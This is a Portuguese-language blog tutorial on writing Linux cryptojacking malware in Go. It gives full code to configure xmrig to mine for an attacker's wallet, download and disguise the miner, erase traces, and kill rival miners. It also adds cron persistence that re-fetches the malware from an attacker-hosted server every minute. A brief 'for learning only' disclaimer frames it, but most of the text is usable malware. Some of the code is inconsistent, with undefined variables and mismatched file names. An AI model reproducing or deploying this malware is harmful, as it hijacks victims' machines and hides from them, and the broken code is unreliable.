---
layout: post
title:  "Creating a silent mining malware with Go"
date:   2022-08-10 01:51:18 -0300
categories: ["Cyber Security"]

---
Com a popularidade das criptomoedas investir na mineração desses ativos certamente foi algo que passou pela cabeça de muitas pessoas, mas os altos custos de hardware e de energia fez com que essa atividade fosse inviável ou pouco rentável para muitas pessoas. Mas e se você pudesse apenas receber os lucros da mineração, sem se preocupar com os gastos em hardware e energia, e além disso usar centenas ou milhares de computadores para isso? Foi isso que motivou cyber criminosos a criar botnets com várias máquinas infectadas com esse tipo de malware conhecido como cryptojacking.


<i>Esse artigo foi escrito únicamente para fins de aprendizado para entusiastas ou profissionais de cybersegurança.</i>


## Etapa 1 - Criando o arquivo de configuração
Nessa primeira etapa iremos criar algumas configurações necessárias para o minerador funcionar.
```go
package main

import (
	"encoding/json"
	"io/ioutil"
	"os/exec"
)
// Aqui a gente define duas estruturas com algumas 
// configurações basicas do xmrig, não é importante entender essa parte.
type Config struct {
	Autosave   bool   `json:"autosave"`
	Cpu        bool   `json:"cpu"`
	Opencl     bool   `json:"opencl"`
	Background bool   `json:"background"`
	Cuda       bool   `json:"cuda"`
	Pools      []Pool `json:"pools"`
	Donate     int    `json:"donate-level"`
}

type Pool struct {
	Url       string `json:"url"`
	User      string `json:"user"`
	Keepalive bool   `json:"keepalive"`
	Tls       bool   `json:"tls"`
}

// Com essas duas estruturas declaradas podemos criar nossa 
// função que vai gerar um arquivo com nossas configurações:
func writeConfig() {
	wallet := "attackers_wallet_here" // aqui vai sua monero wallet

	config := Config{
		Autosave:   false,
		Cpu:        true,
		Opencl:     true,
		Background: true,
		Cuda:       false,
		Donate:     1,
		Pools: []Pool{
			{
				Url:       "pool.minexmr.com:443",
				User:      wallet,
				Keepalive: true,
				Tls:       true,
			},
		},
	}

	file, _ := json.MarshalIndent(config, "", " ")
  
  // escreve as configurações eme um arquivo
	_ = ioutil.WriteFile("config.json", file, 0644)
}
```


## Etapa 2 - Minerando
Antes de montar o payload precisamos pegar a url de download do minerador, podemos encontra-lo nas releases do próprio repositório do <a href="https://github.com/xmrig/xmrig/releases/tag/v6.16.3">xmrig</a>.

```go
func getMiner() {
  // guardamos a url do xmrig em uma variável
  minerLink := "https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-static-x64.tar.gz"
}
```

Em seguida iremos montar o nosso payload em shellscript:

```sh
# tenta baixar o minerador usando wget
wget <xmrig_link>
# tenta baixar o minerador usando curl
curl -L <xmrig_link> 
# descompacta o minerador
tar -zvxf xmrig-6.16.3-linux-static-x64.tar.gz;
# move o arquivo de configuração, que criamos antes, para dentro da pasta do minerador
mv config.json xmrig-6.16.3; 
# renomeia o executável xmrig para um nome menos suspeito
cd xmrig-6.16.3; 
mv xmrig x01service;
# executa o minerador
./x01service; 
# espera o minerador executar e em seguida remove todos os arquivos referentes ao malware.
pid=$!; 
wait $pid; cd ..; 
rm xmrig-6.16.3-linux-static-x64.tar.gz;
pid=$!; 
wait $pid;
rm -R xmrig-6.16.3;
pid=$!;
wait $pid;
rm x01badMin3r;
```

Agora copiamos todo esse payload e colocamos dentro de uma string na nossa função getMiner, substituindo o xmrig_link pela váriavel minerLink que criamos anteriormente.

Em seguida o malware vai criar um arquivo .sh com esse payload dentro, dar permissão, e executar ele na máquina infectada.

```go
func getMiner() {
  minerLink := "https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-static-x64.tar.gz"

  payload := "wget " + minerLink + "; curl -L " + minerLink + "; tar -zvxf xmrig-6.16.3-linux-static-x64.tar.gz; mv config.json xmrig-6.16.3; cd xmrig-6.16.3; mv xmrig x01service; ./x01service; pid=$!; wait $pid; cd ..; rm xmrig-6.16.3-linux-static-x64.tar.gz; pid=$!; wait $pid; rm -R xmrig-6.16.3; pid=$!; wait $pid; rm x01badMin3r;"

// transforma o payload em um array de bytes
  data := []byte(payload)

// cria o arquivo .sh
	ioutil.WriteFile("x01badMin3r.sh", data, 0644)

// da permissão e executa o arquivo .sh na maquina infectada
	exec.Command("chmod", "777", "k4yn.sh").Output()
	exec.Command("chmod", "+x", "k4yn.sh").Output()
	exec.Command("/bin/sh", "k4yn.sh").Output()
}
```

Apenas compilando esse código e executando na maquina infectada ela já vai começar a minerar monero e mandar para a carteira do atacante, mas vamos adicionar algumas outras funcionalidades.

## Etapa 3 - Persistência
Para esse passo você vai precisar hospedar seu malware em algum lugar.

Em seguida usaremos o crontab para fazer a persistência. 

O crontab basicamente é um scheduler que realiza alguma ação em determinado tempo, nesse caso usaremos ele para de minuto em minuto executar um script que baixa e executa novamente nosso malware caso o minerador não esteja mais minerando.

<i>Importante lembrar que o crontab normalmente funciona apenas no Linux</i>

```go
func persistence() {
	binpath:= "http://<server_ip>/<your_malware_name>"

	// script que cria o scheduler do crontab caso ainda não exista
	cr0nt := "if ! crontab -l | grep -q /tmp/cR0ntSc.sh  > /dev/null; then (crontab -l 2>/dev/null; echo \"* * * * * /tmp/cR0ntSc.sh\") | crontab -; (crontab -l 2>/dev/null; echo \"* * * * * /var/cR0ntSc.sh\") | crontab -; (crontab -l 2>/dev/null; echo \"* * * * * /mnt/cR0ntSc.sh\") | crontab -; (crontab -l 2>/dev/null; echo \"* * * * * /root/cR0ntSc.sh\") | crontab -; (crontab -l 2>/dev/null; echo \"* * * * * /cR0ntSc.sh\") | crontab -; (crontab -l 2>/dev/null; echo \"* * * * * /dev/cR0ntSc.sh\") | crontab -; else ls -a; fi"

	// script que será executado pelo crontab caso o minerador pare de minerar
	cr0nscript := "cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget " + binpathaces + "; curl -O " + binpathaces + "; chmod +x *; ./x01badMin3r"

	// cria, da permissão, executa e remove os scripts criados 
	ioutil.WriteFile("cR0nt.sh", data1, 0644)
	ioutil.WriteFile("cR0ntSc.sh", data2, 0644)

	exec.Command("chmod", "777", "cR0nt.sh").Output()
	exec.Command("chmod", "+x", "cR0nt.sh").Output()
	exec.Command("chmod", "+777", "cR0ntSc.sh").Output()
	exec.Command("chmod", "+x", "cR0ntSc.sh").Output()
	exec.Command("/bin/sh", "cR0nt.sh").Output()
	exec.Command("rm", "cR0nt.sh").Output()
}
```

## Etapa 4 - Eliminando a concorrência e juntando as funções
Antes de juntarmos as funções na ordem correta vamos executar um comando que confere se já tem algum minerador xmrig na máquina infectada, se sim finaliza o processo.


```go
func main() {
	exec.Command("sudo", "pkill", "-9", "-f", "xmrig").Output()
	writeConfig()
	persistence()
	getMiner()
}
```

Finalizamos todas as funções do nosso simples malware, agora é só compilar e testar em alguma máquina que você tenha permissão ;)
